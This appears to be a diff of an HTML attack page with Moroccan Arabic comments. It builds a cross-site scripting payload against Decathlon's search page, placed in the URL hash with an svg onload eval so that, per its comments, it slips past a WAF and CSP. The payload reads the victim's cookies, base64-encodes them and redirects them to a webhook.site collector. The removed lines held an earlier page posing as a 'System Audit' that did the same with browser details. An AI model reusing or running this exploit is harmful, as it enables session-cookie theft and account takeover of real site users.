@@ -1,25 +1,24 @@
 <!DOCTYPE html>
 <html>
 <body>
-    <h1>System Audit... Please wait.</h1>
     <script>
-        var webhook = "https://webhook.site/2cbc72eb-5f42-44f9-998b-7a8dd2611ef0";
+        // كود سحب الكوكيز (بما فيها الـ OSID و edge_tid)
+        let payload = `
+            (function(){
+                var cookies = btoa(unescape(encodeURIComponent(document.cookie)));
+                var webhook = "https://webhook.site/2cbc72eb-5f42-44f9-998b-7a8dd2611ef0?leak=" + cookies;
+                
+                // تحويل الصفحة بالكامل باش نهربو من الـ CSP
+                window.location.replace(webhook);
+            })();
+        `;
 
-        // غانحاولو نسرقو المعلومات اللي كيقدر يقرأها المتصفح بلا قيود CORS
-        // ونضيفو ليها تجربة الـ Redirect باش نثبتو أننا نقدروا نخرجو داتا
+        let encoded = encodeURIComponent(payload);
         
-        var info = {
-            domain: document.domain,
-            screen: window.screen.width + "x" + window.screen.height,
-            ua: navigator.userAgent,
-            cookies_visible: document.cookie // غايصيفط غير اللي ماشي HttpOnly
-        };
+        // ديما كنخدمو بالـ Hash # حيت هو اللي كيسلكنا من الـ WAF
+        let target = "https://www.decathlon.com/search?q=test#<svg/onload=eval(decodeURIComponent('" + encoded + "'))>";
 
-        var payload = btoa(JSON.stringify(info));
-
-        // هادي هي الضربة: كنصيفطو الداتا عبر URL Redirect 
-        // هاد الطريقة ما كيحبسهاش CORS حيت المتصفح كيعتبرها "Navigation"
-        window.location.href = webhook + "?exfiltrated_data=" + payload;
+        window.location.href = target;
     </script>
 </body>
 </html>
